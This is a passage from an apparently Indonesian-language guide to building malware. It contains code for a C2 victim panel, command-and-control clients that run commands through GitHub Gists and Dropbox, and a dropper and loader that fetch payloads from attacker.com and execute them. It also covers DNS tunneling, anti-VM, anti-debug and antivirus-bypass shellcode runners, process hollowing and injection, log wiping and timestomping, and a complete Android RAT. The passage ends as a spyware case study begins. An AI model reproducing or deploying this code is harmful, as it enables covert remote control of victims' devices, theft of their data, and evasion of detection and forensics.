    <style>
        body { font-family: Arial; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .online { color: green; }
        .offline { color: red; }
    </style>
</head>
<body>
    <h1>C2 Panel - Victims</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>IP</th>
            <th>Hostname</th>
            <th>OS</th>
            <th>User</th>
            <th>Status</th>
            <th>Last Seen</th>
        </tr>";

$result = $db->query("SELECT * FROM victims ORDER BY last_seen DESC");
while ($row = $result->fetch_assoc()) {
    $status_class = $row['status'] == 'online' ? 'online' : 'offline';
    echo "<tr>
        <td>{$row['id']}</td>
        <td>{$row['ip']}</td>
        <td>{$row['hostname']}</td>
        <td>{$row['os']}</td>
        <td>{$row['user']}</td>
        <td class='$status_class'>{$row['status']}</td>
        <td>{$row['last_seen']}</td>
    </tr>";
}

echo "</table>
</body>
</html>";
?>
```

---
### **📌 Cloud-Hosted C2 (GitHub, Dropbox, Hugging Face)**
---
#### **🔹 GitHub sebagai C2**
**Konsep:**
- **Korban poll GitHub Gist** untuk mendapatkan command.
- **Attacker update Gist** untuk mengirim perintah.
- **Trafik ke github.com** = legitimate.

**File: `github_c2.py` (Client)**
```python
import requests
import subprocess
import time
import json

GIST_ID = "your_gist_id"
GITHUB_TOKEN = "your_github_token"
C2_FILE = "command.txt"
RESULT_FILE = "result.txt"

def get_command():
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers)
    content = r.json()['files'][C2_FILE]['content']
    return content.strip()

def send_result(result):
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    data = {
        "files": {
            RESULT_FILE: {"content": result}
        }
    }
    requests.patch(url, json=data, headers=headers)

while True:
    command = get_command()
    if command:
        try:
            result = subprocess.getoutput(command)
            send_result(result)
        except:
            send_result(f"Error executing: {command}")
    time.sleep(5)
```

---
#### **🔹 Dropbox sebagai C2**
**Konsep:**
- **Korban download file** dari Dropbox.
- **Attacker upload file baru** untuk mengirim perintah.

**File: `dropbox_c2.py` (Client)**
```python
import requests
import subprocess
import time
import json

DROPBOX_TOKEN = "your_dropbox_token"
COMMAND_FILE = "/command.txt"
RESULT_FILE = "/result.txt"

def get_command():
    url = "https://api.dropboxapi.com/2/files/download"
    headers = {"Authorization": f"Bearer {DROPBOX_TOKEN}"}
    data = {"path": COMMAND_FILE}
    r = requests.post(url, headers=headers, json=data)
    return r.json()['result']['content'].decode().strip()

def send_result(result):
    url = "https://api.dropboxapi.com/2/files/upload"
    headers = {
        "Authorization": f"Bearer {DROPBOX_TOKEN}",
        "Content-Type": "application/octet-stream",
        "Dropbox-API-Arg": json.dumps({"path": RESULT_FILE, "mode": "overwrite"})
    }
    requests.post(url, headers=headers, data=result.encode())

while True:
    command = get_command()
    if command:
        try:
            result = subprocess.getoutput(command)
            send_result(result)
        except:
            send_result(f"Error executing: {command}")
    time.sleep(5)
```

---
#### **🔹 Hugging Face sebagai C2**
**Konsep:**
- **Host payload/config** di Hugging Face Spaces.
- **Korban download** dari situ.

**Cara:**
1. Upload file ke **Hugging Face Hub**.
2. Korban download dari:
   ```
   https://huggingface.co/username/repo/resolve/main/payload.exe
   ```

---
### **📌 Domain Fronting (CDN)**
**Konsep:**
- **Request ke CDN besar** (CloudFront, Azure Front Door).
- **Host header diubah** ke domain C2.
- **Trafik keliatan ke CDN**, bukan ke C2.

**Contoh (Python):**
```python
import requests

# Request ke CloudFront dengan Host header ke C2
response = requests.get(
    "https://d111111abcdef8.cloudfront.net/",  # CDN address
    headers={"Host": "c2.yourdomain.com"},    # Domain C2
    verify=True
)
```

**Setup CloudFront:**
1. Buat **CloudFront distribution**.
2. Set **Origin** ke IP VPS.
3. Set **Alternate Domain Name** ke `c2.yourdomain.com`.
4. Korban connect ke `d111111abcdef8.cloudfront.net` dengan `Host: c2.yourdomain.com`.

---
### **📌 DNS Tunneling**
**Konsep:**
- **Data dikirim via DNS query** (subdomain = data encoded).
- **Bypass firewall** (DNS selalu diizinkan).

---
#### **🔹 Server Side (dnscat2)**
```bash
# Install dnscat2
gem install dnscat2

# Start server
dnscat2 --dns "domain=attacker.com" --no-cache

# Output:
# dnscat2> New session: 1
# dnscat2> session -i 1
```

---
#### **🔹 Client Side (iodine)**
```bash
# Install iodine
apt install -y iodine

# Connect ke server
iodine -f -P password tunnel.attacker.com
```

**Cara Kerja:**
1. **Client** mengirim DNS query ke `tunnel.attacker.com`.
2. **Server** (dnscat2/iodined) **decode query** dan **kirim response**.
3. **Data dikirm via DNS** (bukan HTTP/TCP).

---
### **📌 Encryption (AES, RSA, XOR)**
---
#### **🔹 AES Encryption (Python)**
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return json.dumps({'iv': iv, 'ciphertext': ct})

def decrypt(enc_data, key):
    try:
        b64 = json.loads(enc_data)
        iv = base64.b64decode(b64['iv'])
        ct = base64.b64decode(b64['ciphertext'])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except:
        return None

def pad(s, block_size):
    return s + (block_size - len(s) % block_size) * chr(block_size - len(s) % block_size)

def unpad(s, block_size):
    return s[:-ord(s[-1:])]
```

---
#### **🔹 RSA Encryption (Python)**
```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

# Generate key pair
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# Encrypt
cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))
encrypted = cipher_rsa.encrypt(b"Secret Message")
encoded = base64.b64encode(encrypted).decode('utf-8')

# Decrypt
cipher_rsa = PKCS1_OAEP.new(RSA.import_key(private_key))
decrypted = cipher_rsa.decrypt(base64.b64decode(encoded))
```

---
#### **🔹 XOR Encryption (Simple)**
```python
def xor_encrypt(data, key):
    key = key * (len(data) // len(key) + 1)
    return bytes([ord(c) ^ ord(k) for c, k in zip(data, key)])

def xor_decrypt(data, key):
    return xor_encrypt(data, key)  # XOR is symmetric

# Usage
key = "secret_key"
encrypted = xor_encrypt(b"Hello, World!", key)
decrypted = xor_decrypt(encrypted, key).decode()
```

---
---
---

## **🔹 BAB 7: EVASION & ANTI-DETECTION**

---
---
---

### **📌 Obfuscation (PyArmor, Obfuscapk)**
---
#### **🔹 PyArmor (Python Obfuscation)**
**Keunggulan:**
- **Mengubah kode Python** menjadi bytecode terenkripsi.
- **Bypass AV/EDR** (tidak bisa di-analisis statis).
- **Runtime protection** (check license, expiry date).

**Cara Pakai:**
```bash
# Install PyArmor
pip install pyarmor

# Obfuscate script
pyarmor obfuscate --recursive rat_client.py

# Output: dist/rat_client.py (ter-obfuscate)
```

**Opsi Obfuscation:**
| Opsi | Deskripsi |
|------|------------|
| `--obf-code=1` | Obfuscate code logic. |
| `--obf-ast` | Obfuscate AST (Abstract Syntax Tree). |
| `--restrict` | Batasi eksekusi (expired date, hardware binding). |
| `--pack` | Pack ke executable. |

**Contoh:**
```bash
pyarmor obfuscate --obf-code=1 --obf-ast --restrict=expired:2026-12-31 rat_client.py
```

---
#### **🔹 Obfuscapk (APK Obfuscation)**
**Keunggulan:**
- **Obfuscate APK** untuk bypass deteksi.
- **Multi-layer obfuscation** (rename, string encryption, dll).
- **Open source**.

**Cara Pakai:**
```bash
# Install Obfuscapk
git clone https://github.com/CreditTone/Obfuscapk.git
cd Obfuscapk
pip3 install -e .

# Obfuscate APK
Obfuscapk -p -o AntiEmulator -o ResStringEncryption -o MethodOverload payload.apk
```

**Output:**
```
payload_obfuscated.apk
```

---
### **📌 Packing (UPX, VMProtect)**
---
#### **🔹 UPX (Ultimate Packer for eXecutables)**
**Keunggulan:**
- **Kompres file executable** (ukuran lebih kecil).
- **Bypass AV** (beberapa AV tidak scan packed file).
- **Gratis & open source**.

**Cara Pakai:**
```bash
# Install UPX
apt install -y upx  # Linux
# Atau download dari: https://upx.github.io/

# Pack executable
upx --best payload.exe -o packed_payload.exe
```

**Opsi UPX:**
| Opsi | Deskripsi |
|------|------------|
| `--best` | Kompresi maksimal. |
| `--brute` | Coba semua metode kompresi. |
| `--ultra-brute` | Lebih agresif. |
| `-o` | Output file. |

---
#### **🔹 VMProtect (Windows)**
**Keunggulan:**
- **Proteksi tingkat lanjut** (anti-debug, anti-disassembly).
- **Virtualization** (kode dijalankan di VM).
- **Bypass AV/EDR**.

**Cara Pakai:**
1. Download **VMProtect** dari [situs resmi](https://vmpsoft.com/).
2. **Proteksi file executable**:
   - Buka VMProtect GUI.
   - Pilih file `.exe`.
   - Pilih opsi proteksi (Virtualization, Anti-Debug, dll).
   - Build.

---
### **📌 Multi-Stage Payload**
---
#### **🔹 Arsitektur Multi-Stage**
```
[Dropper] (Small, legitimate-looking)
    ↓ (Download & Decrypt)
[Loader] (RC4/XOR encrypted)
    ↓ (Decrypt & Inject)
[RAT] (Main payload, fileless)
```

---
#### **🔹 Contoh Dropper (C)**
**File: `dropper.c`**
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

int main() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hInternet, "attacker.com", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/stage2.bin", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        char buffer[4096];
        DWORD bytesRead;
        HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\stage2.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            WriteFile(hFile, buffer, bytesRead, &bytesRead, NULL);
        }
        CloseHandle(hFile);

        // Execute Stage 2
        WinExec("C:\\Windows\\Temp\\stage2.bin", SW_HIDE);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}
```

---
#### **🔹 Contoh Loader (Python - RC4 Decrypt)**
**File: `loader.py`**
```python
import ctypes
import requests
import base64
from Crypto.Cipher import ARC4

# RC4 Decrypt
def rc4_decrypt(key, data):
    cipher = ARC4.new(key)
    return cipher.decrypt(data)

# Download & decrypt Stage 3
response = requests.get("http://attacker.com/stage3.enc")
key = b"RAHASIA"
stage3 = rc4_decrypt(key, response.content)

# Inject ke memory & execute
kernel32 = ctypes.windll.kernel32
mem = kernel32.VirtualAlloc(None, len(stage3), 0x3000, 0x40)
ctypes.memmove(mem, stage3, len(stage3))
thread = kernel32.CreateThread(None, 0, mem, None, 0, None)
kernel32.WaitForSingleObject(thread, -1)
```

---
### **📌 Code Signing & Certificate Spoofing**
**Keunggulan:**
- **Bypass AV** (file ter-sign dianggap trusted).
- **Bypass Windows SmartScreen** (jika certificate valid).
- **Meningkatkan trust** (korban lebih percaya).

**Cara Pakai:**
1. **Beli certificate** (contoh: Comodo, DigiCert).
2. **Sign executable**:
   ```bash
   # Windows (signtool)
   signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com payload.exe

   # Linux (jarsigner)
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore cert.jks payload.apk cert
   ```

**Alternatif (Free Certificate):**
- **Self-signed certificate** (untuk testing).
- **Let's Encrypt** (untuk HTTPS).

---
### **📌 Anti-Sandbox & Anti-VM**
---
#### **🔹 Deteksi Sandbox/VM**
**Teknik Deteksi:**
| Teknik | Deskripsi | Implementasi |
|--------|------------|---------------|
| **CPU Cores** | VM biasanya punya CPU cores sedikit. | `nproc` (Linux), `wmic cpu get numberofcores` (Windows). |
| **Disk Size** | VM punya disk kecil. | `df -h` (Linux), `wmic logicaldisk get size` (Windows). |
| **MAC Address** | VM punya MAC address vendor (VirtualBox, VMware). | `ip link show` (Linux), `ipconfig /all` (Windows). |
| **Process List** | VM punya process seperti `vboxservice`, `vmtoolsd`. | `ps aux` (Linux), `tasklist` (Windows). |
| **Mouse Movement** | Sandbox jarang gerak mouse. | Track mouse movement. |
| **Time Check** | Sandbox punya waktu yang tidak real-time. | `date` (Linux), `GetSystemTime` (Windows). |

**Contoh Kode (Python - Anti-VM):**
```python
import platform
import psutil
import uuid
import re

def is_vm():
    # Check CPU cores
    if psutil.cpu_count() <= 2:
        return True

    # Check disk size
    if psutil.disk_usage('/').total < 50 * 1024**3:  # <50GB
        return True

    # Check MAC address
    mac = uuid.getnode()
    vm_macs = [
        0x0003FF,  # VirtualBox
        0x000C29,  # VMware
        0x001C42,  # Parallels
        0x0050F2,  # VMware
        0x000569   # VirtualBox
    ]
    for vm_mac in vm_macs:
        if (mac >> 24) == vm_mac:
            return True

    # Check process list
    vm_processes = ['vboxservice', 'vmtoolsd', 'vmsrvc', 'vboxadd']
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in vm_processes:
            return True

    # Check manufacturer
    if platform.system() == "Windows":
        import wmi
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            if 'vmware' in item.Manufacturer.lower() or 'virtual' in item.Manufacturer.lower():
                return True

    return False

if is_vm():
    print("[!] VM/Sandbox detected. Exiting...")
    exit(1)
else:
    print("[+] Real system detected. Executing payload...")
```

---
#### **🔹 Deteksi Debugger**
**Teknik Deteksi:**
| Teknik | Deskripsi | Implementasi |
|--------|------------|---------------|
| **Parent Process** | Debugger punya parent process `gdb`, `x64dbg`. | `ps -p $(ppid $$)` (Linux), `GetParentProcessId` (Windows). |
| **Being Debugged** | Flag `PTRACE_TRACEME` (Linux), `IsDebuggerPresent` (Windows). | `ptrace(PTRACE_TRACEME, 0, NULL, 0)` (Linux), `IsDebuggerPresent()` (Windows). |
| **Time Delay** | Debugger membuat program lambat. | Ukur waktu eksekusi. |
| **Breakpoint Detection** | Check untuk `INT3` (0xCC). | Scan memory untuk 0xCC. |

**Contoh Kode (C - Anti-Debug):**
```c
#include <windows.h>
#include <stdio.h>

BOOL is_debugger_present() {
    // Check IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return TRUE;
    }

    // Check parent process
    HANDLE hProcess = GetCurrentProcess();
    DWORD parentPid;
    GetParentProcessId(hProcess, &parentPid);

    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    if (hParent) {
        CHAR parentName[MAX_PATH];
        GetModuleFileNameExA(hParent, NULL, parentName, MAX_PATH);
        if (strstr(parentName, "gdb") || strstr(parentName, "x64dbg") || strstr(parentName, "ida")) {
            CloseHandle(hParent);
            return TRUE;
        }
        CloseHandle(hParent);
    }

    // Check time delay
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if (end - start > 200) {  // Debugger membuat Sleep lambat
        return TRUE;
    }

    return FALSE;
}

int main() {
    if (is_debugger_present()) {
        printf("[!] Debugger detected. Exiting...\n");
        return 1;
    }
    printf("[+] No debugger detected. Executing payload...\n");
    return 0;
}
```

---
### **📌 Bypass Antivirus (AV/EDR)**
---
#### **🔹 Teknik Bypass AV**
| Teknik | Deskripsi | Keunggulan |
|--------|------------|------------|
| **Obfuscation** | Mengubah kode agar tidak terdeteksi. | Bypass signature-based AV. |
| **Packing** | Kompres file executable. | Bypass static analysis. |
| **Multi-Stage** | Payload dipecah ke beberapa stage. | Bypass behavioral analysis. |
| **Fileless** | Tidak menyimpan file di disk. | Bypass file-based AV. |
| **Process Injection** | Inject ke process legitimate. | Bypass process monitoring. |
| **Syscall Direct** | Panggil syscall langsung. | Bypass user-mode hooks. |
| **Code Signing** | Sign dengan certificate valid. | Bypass trust-based AV. |
| **Anti-Sandbox** | Deteksi & exit di sandbox. | Bypass automated analysis. |

---
#### **🔹 Contoh Bypass AV (Python)**
```python
import subprocess
import sys
import ctypes
import base64
import zlib
import hashlib

# Decrypt shellcode (XOR + Base64)
def decrypt_shellcode(encrypted, key):
    decrypted = bytearray()
    for i in range(len(encrypted)):
        decrypted.append(encrypted[i] ^ key[i % len(key)])
    return decrypted

# Shellcode (contoh: reverse shell)
encrypted_shellcode = base64.b64decode("ENCODED_SHELLCODE")
key = b"SECRET_KEY"
shellcode = decrypt_shellcode(encrypted_shellcode, key)

# Allocate memory & execute
kernel32 = ctypes.windll.kernel32
mem = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(mem, shellcode, len(shellcode))
thread = kernel32.CreateThread(None, 0, mem, None, 0, None)
kernel32.WaitForSingleObject(thread, -1)
```

---
#### **🔹 Contoh Bypass AV (C - Syscall Direct)**
**File: `syscall_shellcode.c`**
```c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    // Load ntdll.dll
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        return 1;
    }

    // Get NtCreateThreadEx
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        return 1;
    }

    // Shellcode (contoh: calc.exe)
    unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00
        // ... (shellcode lengkap)
    };

    // Allocate memory
    PVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        return 1;
    }

    // Copy shellcode
    memcpy(mem, shellcode, sizeof(shellcode));

    // Create thread
    HANDLE hThread;
    NtCreateThreadEx(
        &hThread,
        0x1FFFFF,
        NULL,
        GetCurrentProcess(),
        mem,
        NULL,
        0,
        0,
        0,
        NULL,
        NULL
    );

    // Wait for thread
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

---
---
---

## **🔹 BAB 8: ANTI-FORENSICS & COVERING TRACKS**

---
---
---

### **📌 Log Sanitization**
---
#### **🔹 Linux - Hapus Log**
```bash
# Hapus command history
history -c
cat /dev/null > ~/.bash_history

# Hapus system logs
sudo sh -c 'cat /dev/null > /var/log/auth.log'
sudo sh -c 'cat /dev/null > /var/log/syslog'
sudo sh -c 'cat /dev/null > /var/log/kern.log'
sudo sh -c 'cat /dev/null > /var/log/apache2/access.log'
sudo sh -c 'cat /dev/null > /var/log/nginx/access.log'

# Hapus semua log di /var/log
find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;

# Hapus journalctl logs
journalctl --vacuum=time=1s

# Hapus temporary files
rm -rf /tmp/* /var/tmp/*
```

---
#### **🔹 Windows - Hapus Log**
**PowerShell:**
```powershell
# Hapus Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl Microsoft-Windows-Powershell/Operational

# Hapus browser history (Chrome)
Remove-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -Recurse

# Hapus temporary files
Remove-Item -Path "$env:TEMP\*" -Force -Recurse

# Hapus prefetch files
Remove-Item -Path "C:\Windows\Prefetch\*" -Force -Recurse

# Hapus recent files
Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Recent\*" -Force -Recurse

# Hapus MRU (Most Recently Used)
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Force -Recurse
```

**CMD:**
```batch
:: Hapus Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

:: Hapus temporary files
del /q /f %TEMP%\*
for /d %i in (%TEMP%\*) do @if exist %i rd /s /q "%i"

:: Hapus prefetch
del /q /f C:\Windows\Prefetch\*
```

---
### **📌 Timestomp (Ubah Timestamp)**
**Konsep:** Ubah **timestamp file** agar keliatan lama (seperti file sistem).

---
#### **🔹 Linux - Timestomp**
```bash
# Ubah timestamp file
touch -d "2024-01-15 10:30:00" payload.elf

# Ubah timestamp semua file di direktori
find /path/to/dir -type f -exec touch -d "2024-01-15 10:30:00" {} \;
```

---
#### **🔹 Windows - Timestomp**
**PowerShell:**
```powershell
# Ubah timestamp file
(Get-Item "C:\Windows\Temp\payload.exe").LastWriteTime = "2024-01-15 10:30:00"
(Get-Item "C:\Windows\Temp\payload.exe").CreationTime = "2024-01-15 10:30:00"

# Ubah timestamp semua file di direktori
Get-ChildItem "C:\Windows\Temp\" | ForEach-Object {
    $_.LastWriteTime = "2024-01-15 10:30:00"
    $_.CreationTime = "2024-01-15 10:30:00"
}
```

**CMD:**
```batch
:: Ubah timestamp file
copy /b payload.exe +,,
powershell (Get-Item payload.exe).LastWriteTime = "2024-01-15 10:30:00"
```

---
### **📌 Process Hollowing & Injection**
**Konsep:**
- **Process Hollowing**: Mengganti kode process legit dengan malware.
- **Process Injection**: Menyuntikkan malware ke process yang sudah berjalan.

---
#### **🔹 Process Hollowing (C - Windows)**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. Create process suspended (contoh: svchost.exe)
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    // 2. Allocate memory in target process
    PVOID remoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        4096,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 3. Write shellcode to target process
    unsigned char shellcode[] = { /* shellcode here */ };
    WriteProcessMemory(
        pi.hProcess,
        remoteMem,
        shellcode,
        sizeof(shellcode),
        NULL
    );

    // 4. Change entry point to shellcode
    PVOID entryPoint;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD_PTR)remoteMem;  // x64: RCX = entry point
    SetThreadContext(pi.hThread, &ctx);

    // 5. Resume thread
    ResumeThread(pi.hThread);

    // 6. Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

---
#### **🔹 Process Injection (Python - Windows)**
```python
import ctypes
from ctypes import wintypes

# Define Windows types
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# Open target process (contoh: explorer.exe)
hProcess = kernel32.OpenProcess(
    0x001F3FFF,  # PROCESS_ALL_ACCESS
    False,
    kernel32.GetProcessIdByName("explorer.exe")
)

# Allocate memory
remoteMem = kernel32.VirtualAllocEx(
    hProcess,
    None,
    0x1000,
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x40     # PAGE_EXECUTE_READWRITE
)

# Write shellcode
shellcode = b"\x90\x90\x90..."  # Ganti dengan shellcode sebenarnya
kernel32.WriteProcessMemory(
    hProcess,
    remoteMem,
    shellcode,
    len(shellcode),
    ctypes.byref(wintypes.SIZE_T())
)

# Create remote thread
hThread = kernel32.CreateRemoteThread(
    hProcess,
    None,
    0,
    remoteMem,
    None,
    0,
    None
)

# Wait for thread
kernel32.WaitForSingleObject(hThread, -1)

# Cleanup
kernel32.CloseHandle(hProcess)
kernel32.CloseHandle(hThread)
```

---
### **📌 Secure Deletion (Shred, Srm)**
**Konsep:** Hapus file **secara permanen** (overwrite dengan data random).

---
#### **🔹 Linux - Shred**
```bash
# Overwrite file 10 kali dengan random data
shred -vfz -n 10 sensitive_file.txt

# Hapus file
rm -f sensitive_file.txt

# Overwrite free space
shred -vfz -n 10 /dev/sdX  # Ganti sdX dengan partisi
```

---
#### **🔹 Windows - SDelete (Sysinternals)**
```batch
:: Download SDelete
curl -Lo sdelete.exe https://download.sysinternals.com/files/SDelete.zip
unzip sdelete.exe

:: Overwrite & delete file
sdelete -p 10 -s sensitive_file.exe

:: Overwrite free space
sdelete -c C:
```

---
### **📌 Registry & File System Cleanup**
---
#### **🔹 Windows - Hapus Registry Traces**
**PowerShell:**
```powershell
# Hapus Run keys
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*" -Force -Recurse
Remove-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\*" -Force -Recurse

# Hapus AppData traces
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse
Remove-Item -Path "$env:LOCALAPPDATA\Temp\*" -Force -Recurse

# Hapus Prefetch
Remove-Item -Path "C:\Windows\Prefetch\*" -Force -Recurse

# Hapus Shellbags
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags\*" -Force -Recurse
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Force -Recurse
```

---
#### **🔹 Linux - Hapus File System Traces**
```bash
# Hapus file temporary
rm -rf /tmp/* /var/tmp/*

# Hapus file cache
rm -rf ~/.cache/*

# Hapus file log
find /var/log -type f -name "*.log" -exec rm -f {} \;

# Hapus file yang dibuat payload
find / -name "*payload*" -type f -exec rm -f {} \;
find / -name "*malware*" -type f -exec rm -f {} \;
```

---
---
---

## **🔹 BAB 9: STUDI KASUS & SCENARIO NYATA**

---
---
---

### **📌 Kasus 1: RAT Android dengan C2 Cloud (GitHub)**
**Tujuan:** Bikin RAT Android yang **connect ke GitHub** (bypass firewall).

---
#### **🔹 Arsitektur**
```
[Korban HP] ←── Poll GitHub Gist ──→ [GitHub]
       ↑                                    ↓
       |                            [Attacker Update Gist]
       ↓                                    ↓
[Execute Command] ←─────────── [Receive Result]
```

---
#### **🔹 Payload (Android - Kotlin)**
**File: `GitHubRAT.kt`**
```kotlin
package com.example.githubrat

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MainActivity : android.app.Activity() {
    private val client = OkHttpClient()
    private val gistId = "YOUR_GIST_ID"
    private val githubToken = "YOUR_GITHUB_TOKEN"
    private val commandFile = "command.txt"
    private val resultFile = "result.txt"
    private val deviceId = android.provider.Settings.Secure.getString(
        contentResolver,
        android.provider.Settings.Secure.ANDROID_ID
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Handler(Looper.getMainLooper()).post {
            pollGitHub()
        }
    }

    private fun pollGitHub() {
        val thread = Thread {
            while (true) {
                try {
                    // Get command
                    val command = getCommand()
                    if (command.isNotEmpty()) {
                        // Execute command
                        val result = executeCommand(command)
                        // Send result
                        sendResult(result)
                    }
                    Thread.sleep(5000)  // Poll setiap 5 detik
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        thread.start()
    }

    private fun getCommand(): String {
        val url = "https://api.github.com/gists/$gistId"
        val request = Request.Builder()
            .url(url)
            .header("Authorization", "token $githubToken")
            .build()

        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) throw IOException("Unexpected code $response")
            val json = JSONObject(response.body!!.string())
            return json.getJSONObject("files").getString(commandFile)
        }
    }

    private fun sendResult(result: String) {
        val url = "https://api.github.com/gists/$gistId"
        val json = JSONObject().apply {
            put("files", JSONObject().apply {
                put(resultFile, JSONObject().apply {
                    put("content", result)
                })
            })
        }

        val request = Request.Builder()
            .url(url)
            .header("Authorization", "token $githubToken")
            .patch(json.toString().toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) throw IOException("Unexpected code $response")
        }
    }

    private fun executeCommand(command: String): String {
        return try {
            Runtime.getRuntime().exec(command).inputStream.bufferedReader().readText()
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}
```

---
#### **🔹 C2 (Attacker - Python)**
**File: `github_c2.py`**
```python
import requests
import time
import json

GIST_ID = "YOUR_GIST_ID"
GITHUB_TOKEN = "YOUR_GITHUB_TOKEN"
COMMAND_FILE = "command.txt"
RESULT_FILE = "result.txt"

def update_command(command):
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    data = {
        "files": {
            COMMAND_FILE: {"content": command}
        }
    }
    requests.patch(url, json=data, headers=headers)

def get_result():
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    response = requests.get(url, headers=headers)
    data = response.json()
    return data['files'].get(RESULT_FILE, {}).get('content', '')

while True:
    command = input("Command > ")
    update_command(command)
    time.sleep(2)  # Tunggu korban execute
    result = get_result()
    if result:
        print(f"Result:\n{result}")
```

---
#### **🔹 Keunggulan**
✅ **Bypass Firewall**: Trafik ke `github.com` selalu diizinkan.
✅ **Stealth**: Tidak ada IP mencurigakan.
✅ **Resilient**: GitHub jarang down.

---
---
---

### **📌 Kasus 2: Spyware Windows dengan Keylogger & Screen Capture**
**Tujuan:** Bikin spyware yang **merekam keylog + screenshot** dan kirim ke C2.

---
#### **🔹 Payload (Python - PyInstaller)**
**File: `spyware.py`**
